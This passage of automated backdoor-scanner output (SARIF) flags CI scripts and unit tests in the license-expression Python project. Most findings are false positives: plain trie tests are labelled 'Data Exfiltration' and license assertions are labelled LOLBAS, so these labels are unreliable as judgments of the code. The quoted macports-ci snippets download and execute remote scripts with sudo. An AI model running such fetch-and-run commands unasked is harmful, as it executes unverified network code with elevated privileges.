            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/ci/macports-ci"
                },
                "region": {
                  "startLine": 168,
                  "startColumn": 7,
                  "endLine": 168,
                  "endColumn": 14,
                  "snippet": {
                    "text": "  echo \"macports-ci: Using github\"\n   pushd \"$MACPORTS_PREFIX\"/var/macports/sources\n   sudo mkdir -p github.com/macports/macports-ports/\n   sudo chown -R $USER:admin github.com\n   git clone https://github.com/macports/macports-ports.git github.com/macports/macports-ports/\n   awk '{if($NF==\"[default]\") print \"file:///opt/local/var/macports/sources/github.com/macports/macports-ports/\"; else print}' \"$SOURCES\" > $HOME/$$.tmp\n   sudo mv -f $HOME/$$.tmp \"$SOURCES\"\n",
                    "rendered": {
                      "text": "  echo \"macports-ci: Using github\"\n   pushd \"$MACPORTS_PREFIX\"/var/macports/sources\n   sudo mkdir -p github.com/macports/macports-ports/\n   sudo chown -R $USER:admin github.com\n   git clone https://github.com/macports/macports-ports.git github.com/macports/macports-ports/\n   awk '{if($NF==\"[default]\") print \"file:///opt/local/var/macports/sources/github.com/macports/macports-ports/\"; else print}' \"$SOURCES\" > $HOME/$$.tmp\n   sudo mv -f $HOME/$$.tmp \"$SOURCES\"\n",
                      "markdown": "`  echo \"macports-ci: Using github\"\n   pushd \"$MACPORTS_PREFIX\"/var/macports/sources\n   sudo mkdir -p github.com/macports/macports-ports/\n   sudo chown -R $USER:admin github.com\n   git clone https://github.com/macports/macports-ports.git github.com/macports/macports-ports/\n   awk '{if($NF==\"[default]\") print \"file:///opt/local/var/macports/sources/github.com/macports/macports-ports/\"; else print}' \"$SOURCES\" > $HOME/$$.tmp\n   sudo mv -f $HOME/$$.tmp \"$SOURCES\"\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/ci/macports-ci"
                },
                "region": {
                  "startLine": 143,
                  "startColumn": 1,
                  "endLine": 143,
                  "endColumn": 7,
                  "snippet": {
                    "text": "else\n\n# download installer:\n  curl -LO $URL/$MACPORTS_PKG\n# install:\n  sudo installer -verbose -pkg $MACPORTS_PKG -target /\nfi\n",
                    "rendered": {
                      "text": "else\n\n# download installer:\n  curl -LO $URL/$MACPORTS_PKG\n# install:\n  sudo installer -verbose -pkg $MACPORTS_PKG -target /\nfi\n",
                      "markdown": "`else\n\n# download installer:\n  curl -LO $URL/$MACPORTS_PKG\n# install:\n  sudo installer -verbose -pkg $MACPORTS_PKG -target /\nfi\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/ci/macports-ci"
                },
                "region": {
                  "startLine": 135,
                  "startColumn": 1,
                  "endLine": 135,
                  "endColumn": 6,
                  "snippet": {
                    "text": "if test \"$SOURCE\" = yes ; then\n# download source:\n  curl -LO $URL/MacPorts-${MACPORTS_VERSION}.tar.bz2\n  tar xjf MacPorts-${MACPORTS_VERSION}.tar.bz2\n  cd MacPorts-${MACPORTS_VERSION}\n# install\n  ./configure --prefix=\"$MACPORTS_PREFIX\" --with-applications-dir=\"$MACPORTS_PREFIX/Applications\" >/dev/null &&\n",
                    "rendered": {
                      "text": "if test \"$SOURCE\" = yes ; then\n# download source:\n  curl -LO $URL/MacPorts-${MACPORTS_VERSION}.tar.bz2\n  tar xjf MacPorts-${MACPORTS_VERSION}.tar.bz2\n  cd MacPorts-${MACPORTS_VERSION}\n# install\n  ./configure --prefix=\"$MACPORTS_PREFIX\" --with-applications-dir=\"$MACPORTS_PREFIX/Applications\" >/dev/null &&\n",
                      "markdown": "`if test \"$SOURCE\" = yes ; then\n# download source:\n  curl -LO $URL/MacPorts-${MACPORTS_VERSION}.tar.bz2\n  tar xjf MacPorts-${MACPORTS_VERSION}.tar.bz2\n  cd MacPorts-${MACPORTS_VERSION}\n# install\n  ./configure --prefix=\"$MACPORTS_PREFIX\" --with-applications-dir=\"$MACPORTS_PREFIX/Applications\" >/dev/null &&\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/ci/macports-ci"
                },
                "region": {
                  "startLine": 134,
                  "startColumn": 1,
                  "endLine": 134,
                  "endColumn": 7,
                  "snippet": {
                    "text": "\nif test \"$SOURCE\" = yes ; then\n# download source:\n  curl -LO $URL/MacPorts-${MACPORTS_VERSION}.tar.bz2\n  tar xjf MacPorts-${MACPORTS_VERSION}.tar.bz2\n  cd MacPorts-${MACPORTS_VERSION}\n# install\n",
                    "rendered": {
                      "text": "\nif test \"$SOURCE\" = yes ; then\n# download source:\n  curl -LO $URL/MacPorts-${MACPORTS_VERSION}.tar.bz2\n  tar xjf MacPorts-${MACPORTS_VERSION}.tar.bz2\n  cd MacPorts-${MACPORTS_VERSION}\n# install\n",
                      "markdown": "`\nif test \"$SOURCE\" = yes ; then\n# download source:\n  curl -LO $URL/MacPorts-${MACPORTS_VERSION}.tar.bz2\n  tar xjf MacPorts-${MACPORTS_VERSION}.tar.bz2\n  cd MacPorts-${MACPORTS_VERSION}\n# install\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/ci/macports-ci"
                },
                "region": {
                  "startLine": 96,
                  "startColumn": 40,
                  "endLine": 96,
                  "endColumn": 46,
                  "snippet": {
                    "text": "\npushd \"$(mktemp -d)\"\n\nOSX_VERSION=\"$(sw_vers -productVersion | grep -o '^[0-9][0-9]*\\.[0-9][0-9]*')\"\n\nif test \"$OSX_VERSION\" == 10.10 ; then\n  OSX_NAME=Yosemite\n",
                    "rendered": {
                      "text": "\npushd \"$(mktemp -d)\"\n\nOSX_VERSION=\"$(sw_vers -productVersion | grep -o '^[0-9][0-9]*\\.[0-9][0-9]*')\"\n\nif test \"$OSX_VERSION\" == 10.10 ; then\n  OSX_NAME=Yosemite\n",
                      "markdown": "`\npushd \"$(mktemp -d)\"\n\nOSX_VERSION=\"$(sw_vers -productVersion | grep -o '^[0-9][0-9]*\\.[0-9][0-9]*')\"\n\nif test \"$OSX_VERSION\" == 10.10 ; then\n  OSX_NAME=Yosemite\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/ci/macports-ci"
                },
                "region": {
                  "startLine": 72,
                  "startColumn": 1,
                  "endLine": 72,
                  "endColumn": 8,
                  "snippet": {
                    "text": "  echo \"macports-ci: removing homebrew\"\n  pushd \"$(mktemp -d)\"\n  curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/uninstall > uninstall\n  chmod +x uninstall\n  ./uninstall --force\n  popd\nelse\n",
                    "rendered": {
                      "text": "  echo \"macports-ci: removing homebrew\"\n  pushd \"$(mktemp -d)\"\n  curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/uninstall > uninstall\n  chmod +x uninstall\n  ./uninstall --force\n  popd\nelse\n",
                      "markdown": "`  echo \"macports-ci: removing homebrew\"\n  pushd \"$(mktemp -d)\"\n  curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/uninstall > uninstall\n  chmod +x uninstall\n  ./uninstall --force\n  popd\nelse\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/ci/macports-ci"
                },
                "region": {
                  "startLine": 71,
                  "startColumn": 1,
                  "endLine": 71,
                  "endColumn": 7,
                  "snippet": {
                    "text": "if test \"$KEEP_BREW\" = no ; then\n  echo \"macports-ci: removing homebrew\"\n  pushd \"$(mktemp -d)\"\n  curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/uninstall > uninstall\n  chmod +x uninstall\n  ./uninstall --force\n  popd\n",
                    "rendered": {
                      "text": "if test \"$KEEP_BREW\" = no ; then\n  echo \"macports-ci: removing homebrew\"\n  pushd \"$(mktemp -d)\"\n  curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/uninstall > uninstall\n  chmod +x uninstall\n  ./uninstall --force\n  popd\n",
                      "markdown": "`if test \"$KEEP_BREW\" = no ; then\n  echo \"macports-ci: removing homebrew\"\n  pushd \"$(mktemp -d)\"\n  curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/uninstall > uninstall\n  chmod +x uninstall\n  ./uninstall --force\n  popd\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/ci/macports-ci"
                },
                "region": {
                  "startLine": 37,
                  "startColumn": 38,
                  "endLine": 37,
                  "endColumn": 43,
                  "snippet": {
                    "text": "# this allows to use the script in two ways:\n# 1. as ./macports-ci\n# 2. as source ./macports-ci\n# as of now, choice 2 only changes the env var COLUMNS.\n\nMACPORTS_VERSION=2.6.4\nMACPORTS_PREFIX=/opt/local\n",
                    "rendered": {
                      "text": "# this allows to use the script in two ways:\n# 1. as ./macports-ci\n# 2. as source ./macports-ci\n# as of now, choice 2 only changes the env var COLUMNS.\n\nMACPORTS_VERSION=2.6.4\nMACPORTS_PREFIX=/opt/local\n",
                      "markdown": "`# this allows to use the script in two ways:\n# 1. as ./macports-ci\n# 2. as source ./macports-ci\n# as of now, choice 2 only changes the env var COLUMNS.\n\nMACPORTS_VERSION=2.6.4\nMACPORTS_PREFIX=/opt/local\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/ci/macports-ci"
                },
                "region": {
                  "startLine": 34,
                  "startColumn": 24,
                  "endLine": 34,
                  "endColumn": 32,
                  "snippet": {
                    "text": "\n(\n# start subshell\n# this allows to use the script in two ways:\n# 1. as ./macports-ci\n# 2. as source ./macports-ci\n# as of now, choice 2 only changes the env var COLUMNS.\n",
                    "rendered": {
                      "text": "\n(\n# start subshell\n# this allows to use the script in two ways:\n# 1. as ./macports-ci\n# 2. as source ./macports-ci\n# as of now, choice 2 only changes the env var COLUMNS.\n",
                      "markdown": "`\n(\n# start subshell\n# this allows to use the script in two ways:\n# 1. as ./macports-ci\n# 2. as source ./macports-ci\n# as of now, choice 2 only changes the env var COLUMNS.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/ci/azure-container-rpm.yml"
                },
                "region": {
                  "startLine": 15,
                  "startColumn": 17,
                  "endLine": 15,
                  "endColumn": 22,
                  "snippet": {
                    "text": "        sudo yum install -y \\\n            openssl openssl-devel \\\n            sqlite-devel zlib-devel xz-devel bzip2-devel \\\n            bzip2 tar unzip zip \\\n            libxml2-devel libxslt-devel\n    test_suite: ''\n    test_suite_label: ''\n",
                    "rendered": {
                      "text": "        sudo yum install -y \\\n            openssl openssl-devel \\\n            sqlite-devel zlib-devel xz-devel bzip2-devel \\\n            bzip2 tar unzip zip \\\n            libxml2-devel libxslt-devel\n    test_suite: ''\n    test_suite_label: ''\n",
                      "markdown": "`        sudo yum install -y \\\n            openssl openssl-devel \\\n            sqlite-devel zlib-devel xz-devel bzip2-devel \\\n            bzip2 tar unzip zip \\\n            libxml2-devel libxslt-devel\n    test_suite: ''\n    test_suite_label: ''\n`"
                    }
                  },
                  "sourceLanguage": "yaml"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/ci/azure-container-rpm.yml"
                },
                "region": {
                  "startLine": 13,
                  "startColumn": 11,
                  "endLine": 13,
                  "endColumn": 20,
                  "snippet": {
                    "text": "        set -e -x\n        sudo yum groupinstall -y \"Development Tools\"\n        sudo yum install -y \\\n            openssl openssl-devel \\\n            sqlite-devel zlib-devel xz-devel bzip2-devel \\\n            bzip2 tar unzip zip \\\n            libxml2-devel libxslt-devel\n",
                    "rendered": {
                      "text": "        set -e -x\n        sudo yum groupinstall -y \"Development Tools\"\n        sudo yum install -y \\\n            openssl openssl-devel \\\n            sqlite-devel zlib-devel xz-devel bzip2-devel \\\n            bzip2 tar unzip zip \\\n            libxml2-devel libxslt-devel\n",
                      "markdown": "`        set -e -x\n        sudo yum groupinstall -y \"Development Tools\"\n        sudo yum install -y \\\n            openssl openssl-devel \\\n            sqlite-devel zlib-devel xz-devel bzip2-devel \\\n            bzip2 tar unzip zip \\\n            libxml2-devel libxslt-devel\n`"
                    }
                  },
                  "sourceLanguage": "yaml"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/ci/azure-container-rpm.yml"
                },
                "region": {
                  "startLine": 12,
                  "startColumn": 12,
                  "endLine": 12,
                  "endColumn": 17,
                  "snippet": {
                    "text": "    install_packages: |\n        set -e -x\n        sudo yum groupinstall -y \"Development Tools\"\n        sudo yum install -y \\\n            openssl openssl-devel \\\n            sqlite-devel zlib-devel xz-devel bzip2-devel \\\n            bzip2 tar unzip zip \\\n",
                    "rendered": {
                      "text": "    install_packages: |\n        set -e -x\n        sudo yum groupinstall -y \"Development Tools\"\n        sudo yum install -y \\\n            openssl openssl-devel \\\n            sqlite-devel zlib-devel xz-devel bzip2-devel \\\n            bzip2 tar unzip zip \\\n",
                      "markdown": "`    install_packages: |\n        set -e -x\n        sudo yum groupinstall -y \"Development Tools\"\n        sudo yum install -y \\\n            openssl openssl-devel \\\n            sqlite-devel zlib-devel xz-devel bzip2-devel \\\n            bzip2 tar unzip zip \\\n`"
                    }
                  },
                  "sourceLanguage": "yaml"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/ci/azure-container-rpm.yml"
                },
                "region": {
                  "startLine": 11,
                  "startColumn": 12,
                  "endLine": 11,
                  "endColumn": 17,
                  "snippet": {
                    "text": "    install_python: ''\n    install_packages: |\n        set -e -x\n        sudo yum groupinstall -y \"Development Tools\"\n        sudo yum install -y \\\n            openssl openssl-devel \\\n            sqlite-devel zlib-devel xz-devel bzip2-devel \\\n",
                    "rendered": {
                      "text": "    install_python: ''\n    install_packages: |\n        set -e -x\n        sudo yum groupinstall -y \"Development Tools\"\n        sudo yum install -y \\\n            openssl openssl-devel \\\n            sqlite-devel zlib-devel xz-devel bzip2-devel \\\n",
                      "markdown": "`    install_python: ''\n    install_packages: |\n        set -e -x\n        sudo yum groupinstall -y \"Development Tools\"\n        sudo yum install -y \\\n            openssl openssl-devel \\\n            sqlite-devel zlib-devel xz-devel bzip2-devel \\\n`"
                    }
                  },
                  "sourceLanguage": "yaml"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/ci/azure-container-rpm.yml"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 20,
                  "endLine": 8,
                  "snippet": {
                    "text": "    container: ''\n    python_path: ''\n    python_version: ''\n    package_manager: yum\n    install_python: ''\n    install_packages: |\n        set -e -x\n        sudo yum groupinstall -y \"Development Tools\"\n",
                    "rendered": {
                      "text": "    container: ''\n    python_path: ''\n    python_version: ''\n    package_manager: yum\n    install_python: ''\n    install_packages: |\n        set -e -x\n        sudo yum groupinstall -y \"Development Tools\"\n",
                      "markdown": "`    container: ''\n    python_path: ''\n    python_version: ''\n    package_manager: yum\n    install_python: ''\n    install_packages: |\n        set -e -x\n        sudo yum groupinstall -y \"Development Tools\"\n`"
                    }
                  },
                  "sourceLanguage": "yaml"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.git/info/exclude"
                },
                "region": {
                  "startLine": 1,
                  "startColumn": 1,
                  "endLine": 1,
                  "endColumn": 6,
                  "snippet": {
                    "text": "# git ls-files --others --exclude-from=.git/info/exclude\n# Lines that start with '#' are comments.\n# For a project mostly in C, the following would be a good set of\n# exclude patterns (uncomment them if you want to use them):\n",
                    "rendered": {
                      "text": "# git ls-files --others --exclude-from=.git/info/exclude\n# Lines that start with '#' are comments.\n# For a project mostly in C, the following would be a good set of\n# exclude patterns (uncomment them if you want to use them):\n",
                      "markdown": "`# git ls-files --others --exclude-from=.git/info/exclude\n# Lines that start with '#' are comments.\n# For a project mostly in C, the following would be a good set of\n# exclude patterns (uncomment them if you want to use them):\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/tests/test__pyahocorasick.py"
                },
                "region": {
                  "startLine": 44,
                  "startColumn": 26,
                  "endLine": 44,
                  "endColumn": 31,
                  "snippet": {
                    "text": "\n    def test_get_UnknowWordWithDefaultValueShouldReturnDefault(self):\n        t = Trie()\n        self.assertEqual(t.get('python', 'default'), 'default')\n\n    def test_exists_ShouldDetectAddedWords(self):\n        t = Trie()\n",
                    "rendered": {
                      "text": "\n    def test_get_UnknowWordWithDefaultValueShouldReturnDefault(self):\n        t = Trie()\n        self.assertEqual(t.get('python', 'default'), 'default')\n\n    def test_exists_ShouldDetectAddedWords(self):\n        t = Trie()\n",
                      "markdown": "`\n    def test_get_UnknowWordWithDefaultValueShouldReturnDefault(self):\n        t = Trie()\n        self.assertEqual(t.get('python', 'default'), 'default')\n\n    def test_exists_ShouldDetectAddedWords(self):\n        t = Trie()\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/tests/test__pyahocorasick.py"
                },
                "region": {
                  "startLine": 40,
                  "startColumn": 13,
                  "endLine": 40,
                  "endColumn": 18,
                  "snippet": {
                    "text": "    def test_get_UnknowWordWithoutDefaultValueShouldRaiseException(self):\n        t = Trie()\n        with self.assertRaises(KeyError):\n            t.get('python')\n\n    def test_get_UnknowWordWithDefaultValueShouldReturnDefault(self):\n        t = Trie()\n",
                    "rendered": {
                      "text": "    def test_get_UnknowWordWithoutDefaultValueShouldRaiseException(self):\n        t = Trie()\n        with self.assertRaises(KeyError):\n            t.get('python')\n\n    def test_get_UnknowWordWithDefaultValueShouldReturnDefault(self):\n        t = Trie()\n",
                      "markdown": "`    def test_get_UnknowWordWithoutDefaultValueShouldRaiseException(self):\n        t = Trie()\n        with self.assertRaises(KeyError):\n            t.get('python')\n\n    def test_get_UnknowWordWithDefaultValueShouldReturnDefault(self):\n        t = Trie()\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/tests/test__pyahocorasick.py"
                },
                "region": {
                  "startLine": 35,
                  "startColumn": 39,
                  "endLine": 35,
                  "endColumn": 44,
                  "snippet": {
                    "text": "        assert ('python', 'value') == t.get('python')\n\n        t.add('python', 'other')\n        assert ('python', 'other') == t.get('python')\n\n    def test_get_UnknowWordWithoutDefaultValueShouldRaiseException(self):\n        t = Trie()\n",
                    "rendered": {
                      "text": "        assert ('python', 'value') == t.get('python')\n\n        t.add('python', 'other')\n        assert ('python', 'other') == t.get('python')\n\n    def test_get_UnknowWordWithoutDefaultValueShouldRaiseException(self):\n        t = Trie()\n",
                      "markdown": "`        assert ('python', 'value') == t.get('python')\n\n        t.add('python', 'other')\n        assert ('python', 'other') == t.get('python')\n\n    def test_get_UnknowWordWithoutDefaultValueShouldRaiseException(self):\n        t = Trie()\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/tests/test__pyahocorasick.py"
                },
                "region": {
                  "startLine": 32,
                  "startColumn": 39,
                  "endLine": 32,
                  "endColumn": 44,
                  "snippet": {
                    "text": "    def test_add_existing_WordShouldReplaceAssociatedValue(self):\n        t = Trie()\n        t.add('python', 'value')\n        assert ('python', 'value') == t.get('python')\n\n        t.add('python', 'other')\n        assert ('python', 'other') == t.get('python')\n",
                    "rendered": {
                      "text": "    def test_add_existing_WordShouldReplaceAssociatedValue(self):\n        t = Trie()\n        t.add('python', 'value')\n        assert ('python', 'value') == t.get('python')\n\n        t.add('python', 'other')\n        assert ('python', 'other') == t.get('python')\n",
                      "markdown": "`    def test_add_existing_WordShouldReplaceAssociatedValue(self):\n        t = Trie()\n        t.add('python', 'value')\n        assert ('python', 'value') == t.get('python')\n\n        t.add('python', 'other')\n        assert ('python', 'other') == t.get('python')\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/tests/test__pyahocorasick.py"
                },
                "region": {
                  "startLine": 27,
                  "startColumn": 39,
                  "endLine": 27,
                  "endColumn": 44,
                  "snippet": {
                    "text": "    def test_add_can_get(self):\n        t = Trie()\n        t.add('python', 'value')\n        assert ('python', 'value') == t.get('python')\n\n    def test_add_existing_WordShouldReplaceAssociatedValue(self):\n        t = Trie()\n",
                    "rendered": {
                      "text": "    def test_add_can_get(self):\n        t = Trie()\n        t.add('python', 'value')\n        assert ('python', 'value') == t.get('python')\n\n    def test_add_existing_WordShouldReplaceAssociatedValue(self):\n        t = Trie()\n",
                      "markdown": "`    def test_add_can_get(self):\n        t = Trie()\n        t.add('python', 'value')\n        assert ('python', 'value') == t.get('python')\n\n    def test_add_existing_WordShouldReplaceAssociatedValue(self):\n        t = Trie()\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/tests/test_license_expression.py"
                },
                "region": {
                  "startLine": 2385,
                  "startColumn": 117,
                  "endLine": 2385,
                  "endColumn": 121,
                  "snippet": {
                    "text": "        assert result.original_expression == 'Apache-2.0 WITH MIT'\n        assert not result.normalized_expression\n        assert result.errors == [\n            \"A plain license symbol cannot be used as an exception in a \\\"WITH symbol\\\" statement. for token: \\\"MIT\\\" at position: 16\"]\n        assert result.invalid_symbols == ['MIT']\n\n    def test_validation_invalid_license_exception_strict_false(self):\n",
                    "rendered": {
                      "text": "        assert result.original_expression == 'Apache-2.0 WITH MIT'\n        assert not result.normalized_expression\n        assert result.errors == [\n            \"A plain license symbol cannot be used as an exception in a \\\"WITH symbol\\\" statement. for token: \\\"MIT\\\" at position: 16\"]\n        assert result.invalid_symbols == ['MIT']\n\n    def test_validation_invalid_license_exception_strict_false(self):\n",
                      "markdown": "`        assert result.original_expression == 'Apache-2.0 WITH MIT'\n        assert not result.normalized_expression\n        assert result.errors == [\n            \"A plain license symbol cannot be used as an exception in a \\\"WITH symbol\\\" statement. for token: \\\"MIT\\\" at position: 16\"]\n        assert result.invalid_symbols == ['MIT']\n\n    def test_validation_invalid_license_exception_strict_false(self):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/tests/test_license_expression.py"
                },
                "region": {
                  "startLine": 2377,
                  "startColumn": 66,
                  "endLine": 2377,
                  "endColumn": 70,
                  "snippet": {
                    "text": "        assert result.original_expression == 'Apache-2.0 + MIT'\n        assert not result.normalized_expression\n        assert result.errors == [\n            'Invalid symbols sequence such as (A B) for token: \"+\" at position: 11']\n        assert result.invalid_symbols == ['+']\n\n    def test_validation_invalid_license_exception(self):\n",
                    "rendered": {
                      "text": "        assert result.original_expression == 'Apache-2.0 + MIT'\n        assert not result.normalized_expression\n        assert result.errors == [\n            'Invalid symbols sequence such as (A B) for token: \"+\" at position: 11']\n        assert result.invalid_symbols == ['+']\n\n    def test_validation_invalid_license_exception(self):\n",
